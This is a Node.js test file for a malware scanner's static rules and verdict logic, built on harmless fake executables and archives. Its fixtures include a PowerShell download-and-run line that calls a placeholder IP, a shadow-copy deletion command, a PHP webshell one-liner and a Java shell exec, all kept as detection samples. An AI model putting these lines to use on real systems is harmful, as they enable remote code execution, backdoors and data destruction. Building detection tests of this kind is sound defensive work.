import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { classify, computeVerdict, buildReport, summaryForModel } from '../verdict.mjs';

const RUN = fileURLToPath(new URL('../probe/run.cjs', import.meta.url));

function scan(files, target = '.') {
  const root = mkdtempSync(join(tmpdir(), 'neora-scan-'));
  const work = join(root, 'work'), scratch = join(root, 'scratch');
  mkdirSync(work, { recursive: true }); mkdirSync(scratch);
  for (const [p, c] of Object.entries(files)) { mkdirSync(dirname(join(work, p)), { recursive: true }); writeFileSync(join(work, p), c); }
  const out = execFileSync(process.execPath, [RUN], { env: { PATH: process.env.PATH, NEORA_SCRATCH: scratch, NEORA_WORK: work, NEORA_TARGET: target, NEORA_BUDGET_MS: '10000' }, encoding: 'utf8', timeout: 30000 });
  rmSync(root, { recursive: true, force: true });
  return JSON.parse(out);
}
const utf16 = (s) => Buffer.from(s, 'utf16le');
// Harmless fake PE: valid MZ/PE headers and a UPX0 section, plus plain strings. It is never executed.
function fakePE({ section = 'UPX0', strings = [], wide = [] } = {}) {
  const b = Buffer.alloc(0x400);
  b.write('MZ', 0, 'latin1'); b.writeUInt32LE(0x80, 0x3c);
  b.write('PE\0\0', 0x80, 'latin1');
  b.writeUInt16LE(0x14c, 0x84); b.writeUInt16LE(1, 0x86); b.writeUInt16LE(0xe0, 0x94); b.writeUInt16LE(0x102, 0x96);
  b.writeUInt16LE(0x10b, 0x98);
  b.write(section, 0x80 + 24 + 0xe0, 'latin1');
  return Buffer.concat([b, Buffer.from(strings.join('\0') + '\0', 'latin1'), ...wide.map((w) => utf16(w + '\0'))]);
}
const verdictOf = (r, kind = 'github') => {
  const f = classify({ static: r.static, events: r.dynamic.events, runs: r.dynamic.runs, kind, name: 'x' });
  const nothingRan = !r.static.runnable;
  const notRun = Object.values(r.static.notRun || {}).reduce((a, b) => a + b, 0) + (r.static.archivesSkipped || []).length;
  return { f, v: computeVerdict(f, false, { nothingRan, notRun: notRun > 0 }) };
};

test('exe that cannot run: UTF-16 strings + packer are read and scored, user is told it was NOT executed', () => {
  const r = scan({ 'dropper.exe': fakePE({ strings: ['WinExec', 'URLDownloadToFileW'], wide: ['\\\\.\\PhysicalDrive0', 'vssadmin delete shadows /all'] }) });
  assert.equal(r.static.runnable, false);
  assert.equal(r.static.scan.binary, 1);
  assert.equal(r.static.notRun.exe, 1);
  assert.ok(r.static.rules.mbr_overwrite, 'UTF-16 string must be found');
  assert.ok(r.static.rules.ransom_cmds);
  assert.ok(r.static.flags.some((x) => x.id === 'packed_binary'));
  const { f, v } = verdictOf(r);
  assert.equal(v.level, 'unsafe');
  assert.equal(v.mode, 'static');
  assert.ok(f.some((x) => x.id === 'not_executed'));
  assert.ok(f.some((x) => x.id === 'dropper_apis'));
  const md = buildReport({ label: 'x', kind: 'github', lang: 'tr', verdict: v, findings: f, st: r.static, runs: [], events: [] });
  assert.match(md, /ÇALIŞTIRILMADI/);
  assert.match(summaryForModel({ label: 'x', lang: 'tr', verdict: v, findings: f }), /NOTHING was executed/);
});

test('harmless exe: not executed => "static only" level with a score, never "clean"', () => {
  const r = scan({ 'tool.exe': fakePE({ section: '.text', strings: ['hello world'] }) });
  const { v } = verdictOf(r);
  assert.equal(v.level, 'static');
  assert.ok(v.score >= 0 && v.score < 20);
});

test('archive members are opened read-only and scanned (zip containing an exe + script)', () => {
  const root = mkdtempSync(join(tmpdir(), 'neora-zip-'));
  const zp = join(root, 'a.zip');
  const pe = join(root, 'inner.exe');
  writeFileSync(pe, fakePE({ section: '.text', wide: ['\\\\.\\PhysicalDrive0'] }));
  execFileSync('python3', ['-c', `import zipfile,sys
z=zipfile.ZipFile(sys.argv[1],'w'); z.write(sys.argv[2],'bin/setup.exe'); z.writestr('run.ps1','IEX (New-Object Net.WebClient).DownloadString("http://1.2.3.4/x")'); z.writestr('invoice.pdf.exe','MZ'); z.close()`, zp, pe]);
  const r = scan({ 'pack/a.zip': execFileSync('cat', [zp]) });
  rmSync(root, { recursive: true, force: true });
  assert.equal(r.static.scan.archive, 1);
  assert.equal(r.static.scan.members, 3);
  assert.ok(r.static.rules.mbr_overwrite, 'exe inside zip scanned');
  assert.ok(r.static.rules.ps_download_exec, 'ps1 inside zip scanned');
  assert.ok(r.static.flags.some((x) => x.id === 'double_ext'));
  assert.equal(verdictOf(r).v.level, 'unsafe');
});

test('disguised executable (PE behind .png) and double extension are flagged', () => {
  const r = scan({ 'logo.png': fakePE({ section: '.text' }), 'report.docx.scr': 'x' });
  const ids = r.static.flags.map((x) => x.id);
  assert.ok(ids.includes('disguised_binary'));
  assert.ok(ids.includes('double_ext'));
  assert.equal(verdictOf(r).v.level, 'suspicious');
});

test('more source/script types are read: ps1, bat, vbs, php, java', () => {
  const r = scan({
    'a.ps1': 'powershell -enc AAAA', 'b.bat': 'vssadmin delete shadows /all /quiet', 'c.vbs': 'Set s = CreateObject("WScript.Shell")',
    'd.php': '<?php eval(base64_decode($_POST["x"])); ?>', 'E.java': 'Runtime.getRuntime().exec("sh");',
  });
  for (const id of ['ps_encoded', 'ransom_cmds', 'wscript_shell', 'php_webshell', 'java_exec']) assert.ok(r.static.rules[id], id);
  assert.equal(r.static.scan.text, 5);
});

test('runnable + non-runnable mix gives the PARTIAL level (not "clean")', () => {
  const r = scan({ 'index.js': 'module.exports=1', 'package.json': JSON.stringify({ name: 'p', main: 'index.js' }), 'helper.exe': fakePE({ section: '.text' }) }, '.');
  assert.equal(r.static.runnable, true);
  assert.equal(verdictOf(r, 'npm').v.level, 'partial');
});

test('a plain JS package with nothing unrunnable is still "clean"', () => {
  const r = scan({ 'index.js': 'module.exports=1', 'package.json': JSON.stringify({ name: 'p', main: 'index.js' }) }, '.');
  assert.equal(verdictOf(r, 'npm').v.level, 'clean');
});

test('weak API strings alone are not reported (combo-only)', () => {
  const r = scan({ 'app.exe': fakePE({ section: '.text', strings: ['CreateProcessW', 'FindNextFileW'] }) });
  const { f } = verdictOf(r);
  assert.ok(!f.some((x) => ['dropper_apis', 'ransomware_pattern', 'shellcode_loader'].includes(x.id)));
});
